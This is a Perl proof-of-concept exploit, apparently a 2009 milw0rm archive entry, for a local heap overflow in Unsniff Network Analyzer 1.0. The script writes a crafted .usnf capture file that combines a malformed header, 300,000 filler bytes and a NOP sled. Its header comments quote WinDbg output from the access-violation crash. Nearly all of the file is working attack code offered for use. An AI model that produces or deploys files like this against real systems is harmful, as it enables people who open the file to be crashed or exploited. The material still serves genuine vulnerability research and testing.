#!/usr/bin/perl
#
# Unsniff Network Analyzer 1.0 (usnf) Local Heap Overflow PoC
#
# Summary: Dont just look at hex dumps and protocol trees. With Unsniff
# Network Analyzer, you can view network traffic at various levels of detail.
# View high level objects like images, video, HTML pages, VOIP calls, drill
# down to individual TCP sessions, then onto reassembled PDUs, then finally
# to individual packets. All this functionality is packed in a cool graphical
# interface.
#
# Product web page: http://www.unleashnetworks.com/unsniff/unsniff-2.html
#
# Tested on Microsoft Windows XP Professional SP3 (English)
#
# ----------------------------windbg outpootz-------------------------------
#
# HEAP[usnfctr.exe]: Invalid allocation size - 88888880 (exceeded 7ffdefff)
# (998.d08): Access violation - code c0000005 (first chance)
# First chance exceptions are reported before any exception handling.
# This exception may be expected and handled.
# eax=00000000 ebx=00000000 ecx=22222220 edx=00000000 esi=01248c58 edi=00000000
# eip=018468d1 esp=0012c754 ebp=0012c7dc iopl=0         nv up ei pl nz na po nc
# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210202
# vocore2u!CatFactory_SysLASwizzle+0x24602:
# 018468d1 f3ab            rep stos dword ptr es:[edi]
# Missing image name, possible paged-out or corrupt data.
#
# --------------------------------------------------------------------------
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#
# liquidworm gmail com
#
# http://www.zeroscience.org/
#
# 06.04.2009
#





    	     $a="\x01\x00\x00\x00\x11".
	"\x27\x00\x00\x56\x00\x4F\x00\x44".
    "\x00\x41".	      "\x00".	    "\x54\x00".
   "\x42\x00".	      "\x53".	     "\x00\x31".
  "\x00". "\x00".     "\x00".	  "\x00". "\x00".
  "\x00\x00".	      "\x00".	      "\x00\x00".
  "\x00\x00".	      "\x00".	      "\x00\x00".
  "\x00\x00".	    "\x00\x00".	      "\x00\x00".
   "\x00\x20".    "\x00".  "\x00".    "\x00\x10".
    "\x00\x00".  "\x00".    "\x40".  "\x00\x00".
     "\x00\x40\x04".           "\x00\x02\x00".
      "\x40\x00";$b="\x4A"x300000;$c="\0x0D".
         "\0x0A"x10;$d="\x90"x20;$e="\x00".
		      "\x00".
		   #############
 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
 "\x00\x00\x00\x00\x00\x00\x2C\x24\x00\x00\x2A\x24".
 "\x00\x00". "\x29\x24\x00\x00\x27\x24". "\x00\x00".
 "\x26\x24". "\x00\x00\x24\x24\x00\x00". "\x23\x24".
 "\x00\x00". "\x21\x24\x00\x00\x20\x24". "\x00\x00".
 "\x1E\x24". "\x00\x00\x1D\x24\x00\x00". "\x1B\x24".
 "\x00\x00". "\x1A\x24\x00\x00\x18\x24". "\x00\x00".
 "\x17\x24". "\x00\x00\x15\x24\x00\x00". "\x14\x24".
 "\x00\x00". "\x12\x24\x00\x00\x11\x24". "\x00\x00".
 "\x0F\x24". "\x00\x00\x0E\x24\x00\x00". "\x0C\x24".
 "\x00\x00". "\x0B\x24\x00\x00\x09\x24". "\x00\x00".
 "\x08\x24". "\x00\x00\x06\x24\x00\x00". "\x05\x24".
 "\x00\x00". "\x03\x24\x00\x00\x02\x24". "\x00\x00".
	     "\x00\x24\x00\x00\xFF\x23".
	     "\x00\x00\xFD\x23\x00\x00".
	     "\xFC\x23\x00\x00\xFA\x23".
	     "\x00\x00\xF9\x23\x00\x00".
	 "\xF7\x23\x00\x00\xF6\x23\x00\x00".
     "\xF4\x23\x00\x00\xF3\x23\x00\x00\xF1\x23".
       "\x00\x00\xF0\x23\x00\x00\xEE\x23\x00".
	      "\x00\xED\x23\x00\x00";
	     $file="Denny_Crane.usnf";
		open j, ">./$file";
	    ###########################
		###################
		   #-#-#-##-#-#-#
		       #t00t#

						print j $a.$b.$c.$d.$b.$c.$d.$e;
						close j;sleep 1;print "\nYeah.\n";
						print "File $file successfully landed!\n";

# milw0rm.com [2009-04-06]
